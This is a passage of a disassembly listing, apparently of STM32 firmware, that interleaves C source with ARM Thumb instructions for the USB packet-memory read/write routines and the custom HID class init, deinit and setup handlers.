 8008466:	697b      	ldr	r3, [r7, #20]
 8008468:	4413      	add	r3, r2
 800846a:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800846e:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008470:	69bb      	ldr	r3, [r7, #24]
 8008472:	627b      	str	r3, [r7, #36]	; 0x24
 8008474:	e01b      	b.n	80084ae <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 8008476:	69fb      	ldr	r3, [r7, #28]
 8008478:	781b      	ldrb	r3, [r3, #0]
 800847a:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 800847c:	69fb      	ldr	r3, [r7, #28]
 800847e:	3301      	adds	r3, #1
 8008480:	781b      	ldrb	r3, [r3, #0]
 8008482:	021b      	lsls	r3, r3, #8
 8008484:	b21a      	sxth	r2, r3
 8008486:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800848a:	4313      	orrs	r3, r2
 800848c:	b21b      	sxth	r3, r3
 800848e:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 8008490:	6a3b      	ldr	r3, [r7, #32]
 8008492:	8a7a      	ldrh	r2, [r7, #18]
 8008494:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 8008496:	6a3b      	ldr	r3, [r7, #32]
 8008498:	3302      	adds	r3, #2
 800849a:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 800849c:	69fb      	ldr	r3, [r7, #28]
 800849e:	3301      	adds	r3, #1
 80084a0:	61fb      	str	r3, [r7, #28]
    pBuf++;
 80084a2:	69fb      	ldr	r3, [r7, #28]
 80084a4:	3301      	adds	r3, #1
 80084a6:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80084a8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80084aa:	3b01      	subs	r3, #1
 80084ac:	627b      	str	r3, [r7, #36]	; 0x24
 80084ae:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80084b0:	2b00      	cmp	r3, #0
 80084b2:	d1e0      	bne.n	8008476 <USB_WritePMA+0x38>
  }
}
 80084b4:	bf00      	nop
 80084b6:	bf00      	nop
 80084b8:	372c      	adds	r7, #44	; 0x2c
 80084ba:	46bd      	mov	sp, r7
 80084bc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80084c0:	4770      	bx	lr

080084c2 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 80084c2:	b480      	push	{r7}
 80084c4:	b08b      	sub	sp, #44	; 0x2c
 80084c6:	af00      	add	r7, sp, #0
 80084c8:	60f8      	str	r0, [r7, #12]
 80084ca:	60b9      	str	r1, [r7, #8]
 80084cc:	4611      	mov	r1, r2
 80084ce:	461a      	mov	r2, r3
 80084d0:	460b      	mov	r3, r1
 80084d2:	80fb      	strh	r3, [r7, #6]
 80084d4:	4613      	mov	r3, r2
 80084d6:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 80084d8:	88bb      	ldrh	r3, [r7, #4]
 80084da:	085b      	lsrs	r3, r3, #1
 80084dc:	b29b      	uxth	r3, r3
 80084de:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80084e0:	68fb      	ldr	r3, [r7, #12]
 80084e2:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80084e4:	68bb      	ldr	r3, [r7, #8]
 80084e6:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80084e8:	88fa      	ldrh	r2, [r7, #6]
 80084ea:	697b      	ldr	r3, [r7, #20]
 80084ec:	4413      	add	r3, r2
 80084ee:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80084f2:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80084f4:	69bb      	ldr	r3, [r7, #24]
 80084f6:	627b      	str	r3, [r7, #36]	; 0x24
 80084f8:	e018      	b.n	800852c <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 80084fa:	6a3b      	ldr	r3, [r7, #32]
 80084fc:	881b      	ldrh	r3, [r3, #0]
 80084fe:	b29b      	uxth	r3, r3
 8008500:	613b      	str	r3, [r7, #16]
    pdwVal++;
 8008502:	6a3b      	ldr	r3, [r7, #32]
 8008504:	3302      	adds	r3, #2
 8008506:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 8008508:	693b      	ldr	r3, [r7, #16]
 800850a:	b2da      	uxtb	r2, r3
 800850c:	69fb      	ldr	r3, [r7, #28]
 800850e:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008510:	69fb      	ldr	r3, [r7, #28]
 8008512:	3301      	adds	r3, #1
 8008514:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 8008516:	693b      	ldr	r3, [r7, #16]
 8008518:	0a1b      	lsrs	r3, r3, #8
 800851a:	b2da      	uxtb	r2, r3
 800851c:	69fb      	ldr	r3, [r7, #28]
 800851e:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008520:	69fb      	ldr	r3, [r7, #28]
 8008522:	3301      	adds	r3, #1
 8008524:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008526:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008528:	3b01      	subs	r3, #1
 800852a:	627b      	str	r3, [r7, #36]	; 0x24
 800852c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800852e:	2b00      	cmp	r3, #0
 8008530:	d1e3      	bne.n	80084fa <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 8008532:	88bb      	ldrh	r3, [r7, #4]
 8008534:	f003 0301 	and.w	r3, r3, #1
 8008538:	b29b      	uxth	r3, r3
 800853a:	2b00      	cmp	r3, #0
 800853c:	d007      	beq.n	800854e <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 800853e:	6a3b      	ldr	r3, [r7, #32]
 8008540:	881b      	ldrh	r3, [r3, #0]
 8008542:	b29b      	uxth	r3, r3
 8008544:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 8008546:	693b      	ldr	r3, [r7, #16]
 8008548:	b2da      	uxtb	r2, r3
 800854a:	69fb      	ldr	r3, [r7, #28]
 800854c:	701a      	strb	r2, [r3, #0]
  }
}
 800854e:	bf00      	nop
 8008550:	372c      	adds	r7, #44	; 0x2c
 8008552:	46bd      	mov	sp, r7
 8008554:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008558:	4770      	bx	lr
	...

0800855c <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800855c:	b580      	push	{r7, lr}
 800855e:	b084      	sub	sp, #16
 8008560:	af00      	add	r7, sp, #0
 8008562:	6078      	str	r0, [r7, #4]
 8008564:	460b      	mov	r3, r1
 8008566:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 8008568:	2024      	movs	r0, #36	; 0x24
 800856a:	f004 fd05 	bl	800cf78 <USBD_static_malloc>
 800856e:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 8008570:	68fb      	ldr	r3, [r7, #12]
 8008572:	2b00      	cmp	r3, #0
 8008574:	d109      	bne.n	800858a <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008576:	687b      	ldr	r3, [r7, #4]
 8008578:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800857c:	687b      	ldr	r3, [r7, #4]
 800857e:	32b0      	adds	r2, #176	; 0xb0
 8008580:	2100      	movs	r1, #0
 8008582:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008586:	2302      	movs	r3, #2
 8008588:	e08b      	b.n	80086a2 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 800858a:	687b      	ldr	r3, [r7, #4]
 800858c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008590:	687b      	ldr	r3, [r7, #4]
 8008592:	32b0      	adds	r2, #176	; 0xb0
 8008594:	68f9      	ldr	r1, [r7, #12]
 8008596:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 800859a:	687b      	ldr	r3, [r7, #4]
 800859c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80085a0:	687b      	ldr	r3, [r7, #4]
 80085a2:	32b0      	adds	r2, #176	; 0xb0
 80085a4:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 80085a8:	687b      	ldr	r3, [r7, #4]
 80085aa:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 80085ae:	687b      	ldr	r3, [r7, #4]
 80085b0:	7c1b      	ldrb	r3, [r3, #16]
 80085b2:	2b00      	cmp	r3, #0
 80085b4:	d11b      	bne.n	80085ee <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80085b6:	4b3d      	ldr	r3, [pc, #244]	; (80086ac <USBD_CUSTOM_HID_Init+0x150>)
 80085b8:	781b      	ldrb	r3, [r3, #0]
 80085ba:	f003 020f 	and.w	r2, r3, #15
 80085be:	6879      	ldr	r1, [r7, #4]
 80085c0:	4613      	mov	r3, r2
 80085c2:	009b      	lsls	r3, r3, #2
 80085c4:	4413      	add	r3, r2
 80085c6:	009b      	lsls	r3, r3, #2
 80085c8:	440b      	add	r3, r1
 80085ca:	3326      	adds	r3, #38	; 0x26
 80085cc:	2205      	movs	r2, #5
 80085ce:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80085d0:	4b37      	ldr	r3, [pc, #220]	; (80086b0 <USBD_CUSTOM_HID_Init+0x154>)
 80085d2:	781b      	ldrb	r3, [r3, #0]
 80085d4:	f003 020f 	and.w	r2, r3, #15
 80085d8:	6879      	ldr	r1, [r7, #4]
 80085da:	4613      	mov	r3, r2
 80085dc:	009b      	lsls	r3, r3, #2
 80085de:	4413      	add	r3, r2
 80085e0:	009b      	lsls	r3, r3, #2
 80085e2:	440b      	add	r3, r1
 80085e4:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80085e8:	2205      	movs	r2, #5
 80085ea:	801a      	strh	r2, [r3, #0]
 80085ec:	e01a      	b.n	8008624 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80085ee:	4b2f      	ldr	r3, [pc, #188]	; (80086ac <USBD_CUSTOM_HID_Init+0x150>)
 80085f0:	781b      	ldrb	r3, [r3, #0]
 80085f2:	f003 020f 	and.w	r2, r3, #15
 80085f6:	6879      	ldr	r1, [r7, #4]
 80085f8:	4613      	mov	r3, r2
 80085fa:	009b      	lsls	r3, r3, #2
 80085fc:	4413      	add	r3, r2
 80085fe:	009b      	lsls	r3, r3, #2
 8008600:	440b      	add	r3, r1
 8008602:	3326      	adds	r3, #38	; 0x26
 8008604:	2205      	movs	r2, #5
 8008606:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008608:	4b29      	ldr	r3, [pc, #164]	; (80086b0 <USBD_CUSTOM_HID_Init+0x154>)
 800860a:	781b      	ldrb	r3, [r3, #0]
 800860c:	f003 020f 	and.w	r2, r3, #15
 8008610:	6879      	ldr	r1, [r7, #4]
 8008612:	4613      	mov	r3, r2
 8008614:	009b      	lsls	r3, r3, #2
 8008616:	4413      	add	r3, r2
 8008618:	009b      	lsls	r3, r3, #2
 800861a:	440b      	add	r3, r1
 800861c:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008620:	2205      	movs	r2, #5
 8008622:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008624:	4b21      	ldr	r3, [pc, #132]	; (80086ac <USBD_CUSTOM_HID_Init+0x150>)
 8008626:	7819      	ldrb	r1, [r3, #0]
 8008628:	2302      	movs	r3, #2
 800862a:	2203      	movs	r2, #3
 800862c:	6878      	ldr	r0, [r7, #4]
 800862e:	f004 fa6f 	bl	800cb10 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 8008632:	4b1e      	ldr	r3, [pc, #120]	; (80086ac <USBD_CUSTOM_HID_Init+0x150>)
 8008634:	781b      	ldrb	r3, [r3, #0]
 8008636:	f003 020f 	and.w	r2, r3, #15
 800863a:	6879      	ldr	r1, [r7, #4]
 800863c:	4613      	mov	r3, r2
 800863e:	009b      	lsls	r3, r3, #2
 8008640:	4413      	add	r3, r2
 8008642:	009b      	lsls	r3, r3, #2
 8008644:	440b      	add	r3, r1
 8008646:	3324      	adds	r3, #36	; 0x24
 8008648:	2201      	movs	r2, #1
 800864a:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 800864c:	4b18      	ldr	r3, [pc, #96]	; (80086b0 <USBD_CUSTOM_HID_Init+0x154>)
 800864e:	7819      	ldrb	r1, [r3, #0]
 8008650:	2302      	movs	r3, #2
 8008652:	2203      	movs	r2, #3
 8008654:	6878      	ldr	r0, [r7, #4]
 8008656:	f004 fa5b 	bl	800cb10 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 800865a:	4b15      	ldr	r3, [pc, #84]	; (80086b0 <USBD_CUSTOM_HID_Init+0x154>)
 800865c:	781b      	ldrb	r3, [r3, #0]
 800865e:	f003 020f 	and.w	r2, r3, #15
 8008662:	6879      	ldr	r1, [r7, #4]
 8008664:	4613      	mov	r3, r2
 8008666:	009b      	lsls	r3, r3, #2
 8008668:	4413      	add	r3, r2
 800866a:	009b      	lsls	r3, r3, #2
 800866c:	440b      	add	r3, r1
 800866e:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008672:	2201      	movs	r2, #1
 8008674:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 8008676:	68fb      	ldr	r3, [r7, #12]
 8008678:	2200      	movs	r2, #0
 800867a:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 800867e:	687b      	ldr	r3, [r7, #4]
 8008680:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008684:	687a      	ldr	r2, [r7, #4]
 8008686:	33b0      	adds	r3, #176	; 0xb0
 8008688:	009b      	lsls	r3, r3, #2
 800868a:	4413      	add	r3, r2
 800868c:	685b      	ldr	r3, [r3, #4]
 800868e:	685b      	ldr	r3, [r3, #4]
 8008690:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008692:	4b07      	ldr	r3, [pc, #28]	; (80086b0 <USBD_CUSTOM_HID_Init+0x154>)
 8008694:	7819      	ldrb	r1, [r3, #0]
 8008696:	68fa      	ldr	r2, [r7, #12]
 8008698:	230f      	movs	r3, #15
 800869a:	6878      	ldr	r0, [r7, #4]
 800869c:	f004 fbea 	bl	800ce74 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 80086a0:	2300      	movs	r3, #0
}
 80086a2:	4618      	mov	r0, r3
 80086a4:	3710      	adds	r7, #16
 80086a6:	46bd      	mov	sp, r7
 80086a8:	bd80      	pop	{r7, pc}
 80086aa:	bf00      	nop
 80086ac:	200000a6 	.word	0x200000a6
 80086b0:	200000a7 	.word	0x200000a7

080086b4 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80086b4:	b580      	push	{r7, lr}
 80086b6:	b082      	sub	sp, #8
 80086b8:	af00      	add	r7, sp, #0
 80086ba:	6078      	str	r0, [r7, #4]
 80086bc:	460b      	mov	r3, r1
 80086be:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 80086c0:	4b37      	ldr	r3, [pc, #220]	; (80087a0 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086c2:	781b      	ldrb	r3, [r3, #0]
 80086c4:	4619      	mov	r1, r3
 80086c6:	6878      	ldr	r0, [r7, #4]
 80086c8:	f004 fa60 	bl	800cb8c <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 80086cc:	4b34      	ldr	r3, [pc, #208]	; (80087a0 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086ce:	781b      	ldrb	r3, [r3, #0]
 80086d0:	f003 020f 	and.w	r2, r3, #15
 80086d4:	6879      	ldr	r1, [r7, #4]
 80086d6:	4613      	mov	r3, r2
 80086d8:	009b      	lsls	r3, r3, #2
 80086da:	4413      	add	r3, r2
 80086dc:	009b      	lsls	r3, r3, #2
 80086de:	440b      	add	r3, r1
 80086e0:	3324      	adds	r3, #36	; 0x24
 80086e2:	2200      	movs	r2, #0
 80086e4:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 80086e6:	4b2e      	ldr	r3, [pc, #184]	; (80087a0 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086e8:	781b      	ldrb	r3, [r3, #0]
 80086ea:	f003 020f 	and.w	r2, r3, #15
 80086ee:	6879      	ldr	r1, [r7, #4]
 80086f0:	4613      	mov	r3, r2
 80086f2:	009b      	lsls	r3, r3, #2
 80086f4:	4413      	add	r3, r2
 80086f6:	009b      	lsls	r3, r3, #2
 80086f8:	440b      	add	r3, r1
 80086fa:	3326      	adds	r3, #38	; 0x26
 80086fc:	2200      	movs	r2, #0
 80086fe:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 8008700:	4b28      	ldr	r3, [pc, #160]	; (80087a4 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008702:	781b      	ldrb	r3, [r3, #0]
 8008704:	4619      	mov	r1, r3
 8008706:	6878      	ldr	r0, [r7, #4]
 8008708:	f004 fa40 	bl	800cb8c <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 800870c:	4b25      	ldr	r3, [pc, #148]	; (80087a4 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800870e:	781b      	ldrb	r3, [r3, #0]
 8008710:	f003 020f 	and.w	r2, r3, #15
 8008714:	6879      	ldr	r1, [r7, #4]
 8008716:	4613      	mov	r3, r2
 8008718:	009b      	lsls	r3, r3, #2
 800871a:	4413      	add	r3, r2
 800871c:	009b      	lsls	r3, r3, #2
 800871e:	440b      	add	r3, r1
 8008720:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008724:	2200      	movs	r2, #0
 8008726:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 8008728:	4b1e      	ldr	r3, [pc, #120]	; (80087a4 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800872a:	781b      	ldrb	r3, [r3, #0]
 800872c:	f003 020f 	and.w	r2, r3, #15
 8008730:	6879      	ldr	r1, [r7, #4]
 8008732:	4613      	mov	r3, r2
 8008734:	009b      	lsls	r3, r3, #2
 8008736:	4413      	add	r3, r2
 8008738:	009b      	lsls	r3, r3, #2
 800873a:	440b      	add	r3, r1
 800873c:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008740:	2200      	movs	r2, #0
 8008742:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008744:	687b      	ldr	r3, [r7, #4]
 8008746:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800874a:	687b      	ldr	r3, [r7, #4]
 800874c:	32b0      	adds	r2, #176	; 0xb0
 800874e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008752:	2b00      	cmp	r3, #0
 8008754:	d01f      	beq.n	8008796 <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 8008756:	687b      	ldr	r3, [r7, #4]
 8008758:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800875c:	687a      	ldr	r2, [r7, #4]
 800875e:	33b0      	adds	r3, #176	; 0xb0
 8008760:	009b      	lsls	r3, r3, #2
 8008762:	4413      	add	r3, r2
 8008764:	685b      	ldr	r3, [r3, #4]
 8008766:	689b      	ldr	r3, [r3, #8]
 8008768:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 800876a:	687b      	ldr	r3, [r7, #4]
 800876c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008770:	687b      	ldr	r3, [r7, #4]
 8008772:	32b0      	adds	r2, #176	; 0xb0
 8008774:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008778:	4618      	mov	r0, r3
 800877a:	f004 fc19 	bl	800cfb0 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800877e:	687b      	ldr	r3, [r7, #4]
 8008780:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008784:	687b      	ldr	r3, [r7, #4]
 8008786:	32b0      	adds	r2, #176	; 0xb0
 8008788:	2100      	movs	r1, #0
 800878a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 800878e:	687b      	ldr	r3, [r7, #4]
 8008790:	2200      	movs	r2, #0
 8008792:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008796:	2300      	movs	r3, #0
}
 8008798:	4618      	mov	r0, r3
 800879a:	3708      	adds	r7, #8
 800879c:	46bd      	mov	sp, r7
 800879e:	bd80      	pop	{r7, pc}
 80087a0:	200000a6 	.word	0x200000a6
 80087a4:	200000a7 	.word	0x200000a7

080087a8 <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 80087a8:	b580      	push	{r7, lr}
 80087aa:	b088      	sub	sp, #32
 80087ac:	af00      	add	r7, sp, #0
 80087ae:	6078      	str	r0, [r7, #4]
 80087b0:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80087b2:	687b      	ldr	r3, [r7, #4]
 80087b4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087b8:	687b      	ldr	r3, [r7, #4]
 80087ba:	32b0      	adds	r2, #176	; 0xb0
 80087bc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087c0:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 80087c2:	2300      	movs	r3, #0
 80087c4:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 80087c6:	2300      	movs	r3, #0
 80087c8:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 80087ca:	2300      	movs	r3, #0
 80087cc:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 80087ce:	2300      	movs	r3, #0
 80087d0:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 80087d2:	693b      	ldr	r3, [r7, #16]
 80087d4:	2b00      	cmp	r3, #0
 80087d6:	d101      	bne.n	80087dc <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 80087d8:	2303      	movs	r3, #3
 80087da:	e0f8      	b.n	80089ce <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80087dc:	683b      	ldr	r3, [r7, #0]
 80087de:	781b      	ldrb	r3, [r3, #0]
 80087e0:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80087e4:	2b00      	cmp	r3, #0
 80087e6:	d056      	beq.n	8008896 <USBD_CUSTOM_HID_Setup+0xee>
 80087e8:	2b20      	cmp	r3, #32
 80087ea:	f040 80e8 	bne.w	80089be <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80087ee:	683b      	ldr	r3, [r7, #0]
 80087f0:	785b      	ldrb	r3, [r3, #1]
 80087f2:	3b02      	subs	r3, #2
 80087f4:	2b09      	cmp	r3, #9
 80087f6:	d846      	bhi.n	8008886 <USBD_CUSTOM_HID_Setup+0xde>
 80087f8:	a201      	add	r2, pc, #4	; (adr r2, 8008800 <USBD_CUSTOM_HID_Setup+0x58>)
 80087fa:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80087fe:	bf00      	nop
 8008800:	08008859 	.word	0x08008859
 8008804:	08008837 	.word	0x08008837
 8008808:	08008887 	.word	0x08008887
 800880c:	08008887 	.word	0x08008887
 8008810:	08008887 	.word	0x08008887
 8008814:	08008887 	.word	0x08008887
 8008818:	08008887 	.word	0x08008887
 800881c:	08008869 	.word	0x08008869
 8008820:	08008847 	.word	0x08008847
 8008824:	08008829 	.word	0x08008829
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 8008828:	683b      	ldr	r3, [r7, #0]
 800882a:	885b      	ldrh	r3, [r3, #2]
 800882c:	b2db      	uxtb	r3, r3
 800882e:	461a      	mov	r2, r3
 8008830:	693b      	ldr	r3, [r7, #16]
 8008832:	611a      	str	r2, [r3, #16]
          break;
 8008834:	e02e      	b.n	8008894 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 8008836:	693b      	ldr	r3, [r7, #16]
 8008838:	3310      	adds	r3, #16
 800883a:	2201      	movs	r2, #1
 800883c:	4619      	mov	r1, r3
 800883e:	6878      	ldr	r0, [r7, #4]
 8008840:	f003 fd0e 	bl	800c260 <USBD_CtlSendData>
          break;
 8008844:	e026      	b.n	8008894 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 8008846:	683b      	ldr	r3, [r7, #0]
 8008848:	885b      	ldrh	r3, [r3, #2]
 800884a:	0a1b      	lsrs	r3, r3, #8
 800884c:	b29b      	uxth	r3, r3
